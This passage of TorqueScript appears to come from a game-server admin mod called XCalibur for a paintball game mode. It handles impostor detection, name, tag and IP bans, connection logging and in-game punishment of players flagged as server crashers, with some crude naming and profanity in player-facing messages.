 					bottomprint(%client, "<jc><F0>XCALIBUR WARNING: <F1>IMPOSTER: ++++> <F2>"@%name@"<F1> <++++", 5);
 				}
 			}
 			schedule("centerprint(" @ %clientId @ ", \"<jc><f1>XCalibur: YOU HAVE 10 SECONDS TO GET OFF THAT NAME AND GET ON ANOTHER BEFORE YOUR KICKED\", 0);", 60);
 			schedule("KickImposter(" @ %clientId @ ");", 50, %clientId);
			return;
		}
	}
}
function AutoImposter(%clientId)
{
 	%name = Client::getName(%clientId);
 	%ip = "IP:"@XCalibur::TrimIP(Client::getTransportAddress(%clientId));
 	for (%i = 0; %i < 100; %i = %i + 1)
 	{
 		if(%name == $XAdminName[%i] && %ip != $XAdminIP[%i] || %name == $MAdminName[%i] && %ip != $MAdminIP[%i] || %name == $SAdminName[%i] && %ip != $SAdminIP[%i] || %name == $PAdminName[%i] && %ip != $PAdminIP[%i] )
 		{
	 		%clientId.isImposter = true;
 			echo("AUTO ADMIN IMPOSTER: ++++> "@%name@" <++++");
 			$Name = %name;
 			$IP = %ip;
 			$Space = "--------------------------------------------------------------";
 			export("$Name", "config\\imposters.txt", true);
 			export("$IP", "config\\imposters.txt", true);
 			export("$Space", "config\\imposters.txt", true);
 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
    			{
    				%client = Player::getClient(%cl);
 				if(%client.isGrey)
 				{
 					bottomprint(%client, "<jc><F0>XCALIBUR WARNING: <F1>IMPOSTER: ++++> <F2>"@%name@"<F1> <++++", 5);
 				}
 			}
 			schedule("KickAutoImposter(" @ %clientId @ ");", 0.1, %clientId);
 			return;
 		}
		if(%name == $OtherMemberName[%i] && $client::Info[%clientId, 5] != $OtherInfoField[%i])
		{
 			%clientId.isImposter = true;
 			echo("AUTO ADMIN IMPOSTER: ++++> "@%name@" <++++");
 			$Name = %name;
 			$IP = %ip;
 			$Space = "--------------------------------------------------------------";
 			export("$Name", "config\\imposters.txt", true);
 			export("$IP", "config\\imposters.txt", true);
 			export("$Space", "config\\imposters.txt", true);
 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
    			{
    				%client = Player::getClient(%cl);
 				if(%client.isGrey)
 				{
 					bottomprint(%client, "<jc><F0>XCALIBUR WARNING: <F1>IMPOSTER: ++++> <F2>"@%name@"<F1> <++++", 5);
 				}
 			}
 			schedule("centerprint(" @ %clientId @ ", \"<jc><f1>XCalibur: YOU HAVE 10 SECONDS TO GET OFF THAT NAME AND GET ON ANOTHER BEFORE YOUR KICKED\", 0);", 60);
 			schedule("KickImposter(" @ %clientId @ ");", 50, %clientId);
 			return;
		}
 	}
}
function Tagless(%clientId) { 	%name = Client::getName(%clientId); 	%ip = "IP:"@XCalibur::TrimIP(Client::getTransportAddress(%clientId)); 	for (%i = 0; %i < 100; %i = %i + 1) 	{ 		if($MemberName[%i] != "" && $ClanMemberIP[%i] != "") 		{ 			if(string::findsubstr(%name, $MemberName[%i]) != "0" && string::findsubstr(%ip, $ClanMemberIP[%i]) != "-1") 			{ 				if(string::findsubstr(%name, $ClanTag) != "-1") 				{ 					return; 				} 				else 				{ 					echo("TAGLESS MEMBER: ++++> "@%name@" <++++"); 					%clientId.isTagless = true; 					for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))    					{    						%client = Player::getClient(%cl); 						if(%client.isGrey) 						{ 							bottomprint(%client, "<jc><F0>XCALIBUR WARNING: <F1>TAGLESS MEMBER: ++++> <F2>"@%name@"<F1> <++++", 5); 						} 					}

  					    					%found = 0;    					for (%i=0; $XCalibur::ClanMemberInfo[%i,0]!="";%i++)    					{       						if($XCalibur::ClanMemberInfo[%i,0] == %ip)       						{          						          						%found = 1;          						break;       						}    					}

   					if (%found)    					{      						      						%found = 0;      						for (%j=1; $XCalibur::ClanMemberInfo[%i,%j] != "";%j++)      						{         						if($XCalibur::ClanMemberInfo[%i,%j] == %name)         						{            							           						 	%found = 1;            							break;         						}      						}

     						      						for (%k=1; $XCalibur::ClanMemberInfo[%i,%k] != "";%k++)      						{         						if(%j != %k)         						{            							if(%clientId == 0)            							{            								$rname = $XCalibur::ClanMemberInfo[%i, %k];            							}            							else            							{            								$rname = $XCalibur::ClanMemberInfo[%i, %k];            							}         						}      						}    					}    					else    					{        						    					} 					schedule("centerprint(" @ %clientId @ ", \"<jc><f0>XCalibur: <F2>GO PUT ON YOUR TAG, YOU CANNOT HAVE ADMIN WITHOUT IT\", 0);", 60); 					$Name = %name; 					$ClanName = $rname; 					$IP = %ip; 					$Space = "--------------------------------------------------------------"; 					export("$Name", "config\\tagless.txt", true); 					export("$ClanName", "config\\tagless.txt", true); 					export("$IP", "config\\tagless.txt", true); 					export("$Space", "config\\tagless.txt", true); 					return; 				}	 			} 		} 	} }

function Member(%clientId) 
{
 	%name = Client::getName(%clientId);
 	for(%i = 0; %i < 100; %i++)
 	{
 		if(%name == $MemberName[%i])
 		{
 			%clientId.NameMatch = true;
 			MemberIP(%clientId, %name);
 		}
 	}
}
function MemberOther(%clientId, %info)
{
	%name = client::getName(%clientId);
	for(%i = 0; $OtherInfoField[%i] != ""; %i++)
	{
		%pw = $OtherInfoField[%i];
		%storedname = $OtherMemberName[%i];
		if(%info == %pw && %name == %storedname)
		{
			%clientId.NameMatch = true;
			Messageall(3, "XCalibur: A Clan Member Has Joined The Game");
 			echo("Clan Member Connection: "@%name@"");
 			%clientId.isClan = true;
			return;
		}
	}
}
function MemberIP(%clientId, %name)
{
 	%ip = "IP:"@XCalibur::TrimIP(Client::getTransportAddress(%clientId));
 	for(%i = 0; %i < 100; %i++)
 	{
 		if(%ip == $ClanMemberIP[%i] && %clientId.NameMatch)
 		{
 			Messageall(3, "XCalibur: A Clan Member Has Joined The Game");
 			echo("Clan Member Connection: "@%name@"");
 			%clientId.isClan = true;
 		}
 	}
}

function XCheck(%clientId) { 	%name = client::getName(%clientId); 	for(%i = 0; %i < 100; %i++) 	{ 		if(%name == $XAdminName[%i]) 		{			%clientId.isOnX = true; 			return; 		} 		else  		{ 			MCheck(%clientId, %name); 			return; 		} 	} }

function MCheck(%clientId, %name) { 	for(%i = 0; %i < 100; %i++) 	{ 		if(%name == $MAdminName[%i]) 		{ 					%clientId.isOnX = true; 			return; 		} 		else  		{ 			SCheck(%clientId, %name); 			return; 		} 	} }

function SCheck(%clientId, %name) { 	for(%i = 0; %i < 100; %i++) 	{ 		if(%name == $SAdminName[%i]) 		{ 		 			%clientId.isOnX = true; 			return; 		} 		else  		{ 			PCheck(%clientId, %name); 			return; 		} 	} }	

function PCheck(%clientId, %name) { 	for(%i = 0; %i < 100; %i++) 	{ 		if(%name == $PAdminName[%i]) 		{ 					%clientId.isOnX = true; 			return; 		} 		else  		{ 		 			%clientId.canBeAddedToX = true; 			return; 		} 	} }		 function Normal(%clientId) { 	%name = Client::getName(%clientId); 	%ip = "IP:"@XCalibur::TrimIP(Client::getTransportAddress(%clientId)); 	for(%i = 0; %i < 100; %i++) 	{ 		if(%name != $MemberName[%i]) 		{ 			if(string::findsubstr(%name, $ClanTag) != "-1") 			{ 			 				%clientId.canBeAddedToM = true; 				return; 			}	 		} 	} } function KickImposter(%clientId) { 	if(%clientId.isImposter) 	{ 		Net::Kick(%clientId, "NEXT TIME DONT USE CLAN MEMBERS NAMES"); 	} } function KickAutoImposter(%clientId) { 	Net::Kick(%clientId, "NEXT TIME DONT USE AUTO ADMIN NAMES"); }

function KickBan(%clientId) { 	Net::Kick(%clientId, "YOU ARE BANNED, GET OUT"); } $AIP1 = "IP:192.168.1.*"; $AIP2 = "IP:169.254.26.*"; $AIP3 = "IP:24.56.39.*"; function OtherFuncs(%clientId) { 	%ip = Client::getTransportAddress(%clientId); 	%ip1 = "IP:"@XCalibur::TrimIP(%ip); 	%name = Client::getName(%clientId); 	$XCalibur::PlayerName: = %name; 	$XCalibur::PlayerIP: = %ip; 	$XCalibur::Space = "------------------------------------------------------------------------------"; 	export("$XCalibur::PlayerName:", "config\\connections.txt", true); 	export("$XCalibur::PlayerIP:", "config\\connections.txt", true); 	export("$XCalibur::Space", "config\\connections.txt", true); 	 	return; }

function Name1Ban(%clientId) { 	%name = client::getName(%clientId); 	%ip = Client::getTransportAddress(%clientId); 	for (%i = 0; %i < 100; %i = %i + 1) 	{ 		if($PlayerName[%i] != "") 		{ 			if(string::findsubstr(%name, $PlayerName[%i]) != "-1") 			{ 				echo("NAME BAN FOUND, NOW KICKING"); 				messageall(1, "XCalibur: WARNING ++++> "@%name@" <++++ IS AME BANNED"); 		%ip = "IP:"@XCalibur::TrimIP(client::getTransportAddress(%clientId));		banlist::add(%ip, 259200); 	BanList::export("config\\banlist.cs");			schedule("KickBan(" @ %clientId @ ");", 0.1, %clientId); 				return; 			} 		} 	} }

function Tag(%clientId) { 	%name = client::getName(%clientId); 	%ip = Client::getTransportAddress(%clientId); 	for (%i = 0; %i < 100; %i = %i + 1) 	{ 		if($TagBAN[%i] != "") 		{ 			if(string::findsubstr(%name, $TagBAN[%i]) != "-1") 			{ 				echo("TAG BAN FOUND, NOW KICKING"); 				messageall(1, "XCalibur: WARNING THE TAG ON ++++> "@%name@" <++++ IS BANNED"); 			%ip = "IP:"@XCalibur::TrimIP(client::getTransportAddress(%clientId));	banlist::add(%ip, 259200); 	BanList::export("config\\banlist.cs");			schedule("KickBan(" @ %clientId @ ");", 0.1, %clientId); 				return; 			} 		} 	} }

function IP1Ban(%clientId) { 	%name = client::getName(%clientId); 	%ip = Client::getTransportAddress(%clientId); 	for (%i = 0; %i < 100; %i = %i + 1) 	{ 		if($BannedIP[%i] != "") 		{ 			if(string::findsubstr(%ip, $BannedIP[%i]) != "-1") 			{ 				echo("IP BAN FOUND, NOW KICKING"); 				messageall(1, "XCalibur: WARNING ++++> "@%name@" <++++ IS IP BANNED"); 			%ip = "IP:"@XCalibur::TrimIP(client::getTransportAddress(%clientId));	banlist::add(%ip, 259200); 	BanList::export("config\\banlist.cs");			schedule("KickBan(" @ %clientId @ ");", 0.1, %clientId); 				return; 			} 		} 	} }

function Perma1Ban(%clientId) { 	%name = client::getName(%clientId); 	%ip = Client::getTransportAddress(%clientId); 	for (%i = 0; %i < 100; %i = %i + 1) 	{ 		if($PermaBannedIP[%i] != "") 		{ 			if(string::findsubstr(%ip, $PermaBannedIP[%i]) != "-1" || string::findsubstr(%name, $PermaBannedName[%i]) != "-1") 			{ 				echo("PERMANENT BAN FOUND, NOW KICKING"); 				messageall(1, "XCalibur: WARNING ++++> "@%name@" <++++ IS PERMANENTLY BANNED"); 	%ip = "IP:"@XCalibur::TrimIP(client::getTransportAddress(%clientId));			BanList::add(%ip, 972512322); 	BanList::export("config\\banlist.cs");			schedule("KickBan(" @ %clientId @ ");", 0.1, %clientId); 				return; 			} 		} 	} }

function NewPerson(%clientId) {    %name = Client::getName(%clientId);    %ip = XCalibur::TrimIP(Client::getTransportAddress(%clientId));

   $XCalibur::clientInfo = %ip @ " " @ escapeString(%name) @ " " @ "cl:" @ %clientId;    export("$XCalibur::clientInfo", "config\\TempConnections.cs", true);

      %found = 0;    for (%i=0; $XCalibur::PlayerInfo[%i,0]!="";%i++)    {       if($XCalibur::PlayerInfo[%i,0] == %ip)       {                    %found = 1;          break;       }    }

   if (%found)    {            %found = 0;      for (%j=1; $XCalibur::PlayerInfo[%i,%j]!="";%j++)      {         if($XCalibur::PlayerInfo[%i,%j] == %name)         {                        %found = 1;            break;         }      }

     if (!%found)      {       $XCalibur::PlayerInfo[%i,%j] = %name;       export("XCalibur::PlayerInfo*", "config\\Connections.cs", false);      }    }    else    {       $XCalibur::PlayerInfo[%i,0] = %ip;       $XCalibur::PlayerInfo[%i,1] = %name;       export("XCalibur::PlayerInfo*", "config\\Connections.cs", false);    } } exec("connections.cs");

function PBT_oldMODInfo(%server, %modString) {    if(%server == 2048)    {       $ServerModInfo = %modString;              if($ServerModInfo != "")       {          Control::setValue(ModTextString, "<jc>" @ %modString);       }    } }

function RapeTheCrasher(%clientId)   { 	 AddPermBan(%clientId); 	%ip2 = XCalibur::TrimIP(client::GetTransportAddress(%clientId)); 	%name = client::getName(%clientId);    	%found = 0;    	for (%i=0; $XCalibur::PlayerInfo[%i,0]!="";%i++)    	{       		if($XCalibur::PlayerInfo[%i,0] == %ip2)       		{          		          		%found = 1;          		break;       		}    	}

   	if (%found)    	{      		      		%found = 0;      		for (%j=1; $XCalibur::PlayerInfo[%i,%j] != "";%j++)      		{         		if($XCalibur::PlayerInfo[%i,%j] == %name)         		{            			           			%found = 1;            			break;         		}      		}

     		      		for (%k=1; $XCalibur::PlayerInfo[%i,%k] != "";%k++)      		{         		if(%j != %k)         		{            			if(%clientId == 0)            			{            				$cname = $XCalibur::PlayerInfo[%i, %k];            			}            			else            			{            				$cname = $XCalibur::PlayerInfo[%i, %k];            			}         		}      		}    	}    	else    	{        		    	}    	 	 	  	%ip1 = "IP:"@TrimIP(client::getTransportAddress(%clientId)); 	%crasher = client::getName(%clientId); 	%NuminServer = getNumClients(); 	$Header = "                       Attempted Crashes On Server"; 	$Crasher = %crasher; 	$CrasherAlias = $cname; 	$CrasherIP = %ip1; 	$PlayersInServer = %NuminServer; 	$Spacer = "*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*"; 	$Space = "                                                                                ";

	 	 	echo(" "); 	echo("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*"); 	echo("	"); 	echo("   >>>>>   XCALIBUR EMERGENCY NOTIFICATION::ATTEMPTED SERVER CRASH   <<<<<"); 	echo("           _______________________________________________________		"); 	echo(" "); 	echo("		Crashers Name: "@%crasher@""); 	echo("		Crashers IP: "@%ip1@""); 	echo("		Crashers Alias's: "@$cname@""); 	echo("		Players Possibly Affected: "@%NuminServer@""); 	echo(" "); 	echo("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*"); 	echo(" "); 	 	 	 	messageall(1, "XCALIBUR ALERT: WARNING: "@%crasher@" TRIED TO CRASH THE SERVER"); 	 	 	%player = Client::getOwnedObject(%clientId);  	BlindHim(%player); 	 	 	 	XCalibur::ADHD(%clientId); 	 	 	 	%tortures = 8; 	XCalibur::DIZZY(%clientId, %tortures); 	 	 	 	Strip(%clientId); 	 	 	 	export("$Spacer", "config\\CrashAttempts.txt", true); 	export("$Crasher", "config\\CrashAttempts.txt", true); 	export("$CrasherAlias", "config\\CrashAttempts.txt", true); 	export("$CrasherIP", "config\\CrashAttempts.txt", true); 	export("$PlayersInServer", "config\\CrashAttempts.txt", true); 	 	 	$XCalibur::Name = $Crasher; 	$XCalibur::IP = $CrasherIP; 	$XCalibur::Message = "Auto-Ban For Attempting A Crash"; 	$XCalibur::Space = "-------------------------------------------------------------------------"; 	export("$XCalibur::Name", "config\\banmessages.txt", true); 	export("$XCalibur::IP", "config\\banmessages.txt", true); 	export("$XCalibur::Message", "config\\banmessages.txt", true); 	export("$XCalibur::Space", "config\\banmessages.txt", true); 	 	 	 	%ip = "IP:"@XCalibur::TrimIP(client::getTransportAddress(%clientId)); 	banlist::Add(%ip, 972512322); 	 BanList::export("config\\banlist.cs");	 	 	schedule("Centerprint("@%clientId@", \"<JC><F2>How You Like Them Apples?\", 5);",38); 	 }

function BlindHim(%player) { 	Player::setDamageFlash(%player, 0.75); 	schedule("BlindHim(" @ %player @ ");",1,%player); }

function XCalibur::ADHD(%clientId) { 	%v = 400; 	%zVec = 40; 	%vector = Vector::getFromRot(GameBase::getRotation(%clientId), %v, %zVec); 	Player::applyImpulse(%clientId, %vector); 	schedule("Stop("@%clientId@");",1.5,%clientId); 	schedule("XCalibur::ADHD(" @ %clientId @ ");",2,%clientId); }

function Strip(%clientId) { 	Player::dropItem(%clientId,Flag); 	if(%clientId.observerMode == "" || %clientId.observerMode == "pregame") 	{ 		%numweapon = Player::getItemClassCount(%clientId,"Weapon"); 		%max = getNumItems();  		for (%i = 0; %i < %max; %i = %i + 1) 		{ 			%item = getItemData(%i); 			%count = Player::getItemCount(%clientId,%item);  			if(%count) 			{ 				Player::setItemCount(%clientId,%item,0);  			} 		} 		Player::setDamageFlash(%clientId,1);   	} }

function XCalibur::DIZZY(%clientId, %tortures) { 	%tortures--; 	playNextAnim(%clientId); 	if (%tortures > 0) 	{ 		client::sendMessage(%clientId, 1, "XCALIBUR: NEXT TIME DON'T TRY TO CRASH SERVERS"); 		schedule("XCalibur::DIZZY(" @ %clientId @ ", "@ %tortures @");", 4.0, %clientId ); 	} 	else 	{ 		centerprint(%clientId, "<JC>XCalibur: <F2> GET THE FUCK OFF MY SERVER", 10); 	} }

function Stop(%clientId) { 	Item::setVelocity(%clientId, "0 0 0"); } exec("connections.cs");    echo("========================================================\n		XCalibur Locked And Loaded, Enjoy\n========================================================"); CenterPrintAll("<jc><F0>XCALIBUR <F1>LOCKED <F2>AND <F0>LOADED");             


      	  

     

	

function Tactical(%clientId)
{
	if($Tactical)
	{
		
		$spawnBuyList[0, %clientId] = "LightArmor";
   		$spawnBuyList[1, %clientId] = "Delta";
   		$spawnBuyList[2, %clientId] = "DeltaAmmo";
   		$spawnBuyList[3, %clientId] = "DeltaClip";
   		$spawnBuyList[4, %clientId] = "";
   		$spawnBuyList[5, %clientId] = "";
	}
}

function FindIP(%clientId, %name, %k)
{
	for(%i = 0; $XCalibur::PlayerInfo[%k,%i] != ""; %i++)
	{
		if($XCalibur::PlayerInfo[%k,%i] == %name)
		{
			echo("Found IP For "@%name@": IP:"@$XCalibur::PlayerInfo[%k,0]);
			$RECENTUSERSET = "True";
			$LatestPlayer = %name;
			$LatestIP = "IP:"@$XCalibur::PlayerInfo[%k,0];
			bottomprint(%clientId, "<jc><F0>XCalibur: <F1>Match Found:\n<jc><F0>Player Info:  <F1>|   <F2>"@%name@"   <F1>|   <F2>IP:"@$XCalibur::PlayerInfo[%k,0]@"   <F1>|", 0);
			break;
		}
		else if($XCalibur::PlayerInfo[%k,%i] != %name)
		{
		        if($XCalibur::PlayerInfo[%k,%i+1] == "")
			{
				if($XCalibur::PlayerInfo[%k+1,0] != "")
				{
					%k = %k++;
					FindIP(%clientId, %name, %k);
					break;
				}
				else if($XCalibur::PlayerInfo[%k+1,0] == "")
				{
					echo("No Match Found");
					bottomprint(%clientId, "<jc><F0>XCalibur: <F1>No Match Found");
					break;
				}
			}
		}
	}
}
function remoteSetCLInfo(%clientId, %skin, %name, %email, %tribe, %url, %info, %autowp, %enterInv, %msgMask)
{
   $Client::info[%clientId, 0] = %skin;
   $Client::info[%clientId, 1] = %name;
   $Client::info[%clientId, 2] = %email;
   $Client::info[%clientId, 3] = %tribe;
   $Client::info[%clientId, 4] = %url;
   $Client::info[%clientId, 5] = %info;
   if(%autowp)
      %clientId.autoWaypoint = true;
   if(%enterInv)
      %clientId.noEnterInventory = true;
   if(%msgMask != "")
      %clientId.messageFilter = %msgMask;
   OtherImposter(%clientId, %info);
   MemberOther(%clientId, %info);
}		
function AddPermBan(%clientId)
{
	%ip = XCalibur::TrimIP(client::getTransportAddress(%clientId));
	%clname = client::getName(%clientId);
	%AdminName = "Server Auto Ban For Crash";
	XPermaBan(%ip, %clname, %clientId, %AdminName);
}
exec("PBTactical.cs");
$MODInfoT = "<jc><f0>Welcome to<f2> Paintball <f1>"@$MODVersion@"\n"@
           "<jc><f3>Advancements By: <f2>+]-[+Armageddon+ <f3>& <f2>+]-[+WorstAim\n"@
	   "<jc><f0>Features: <f2>SafeSpawn, SpawnFavs, Advanced Admin System,\n"@
	   "<jc><f2>Advanced Map Editor, More Weapons, More Packs & Addons";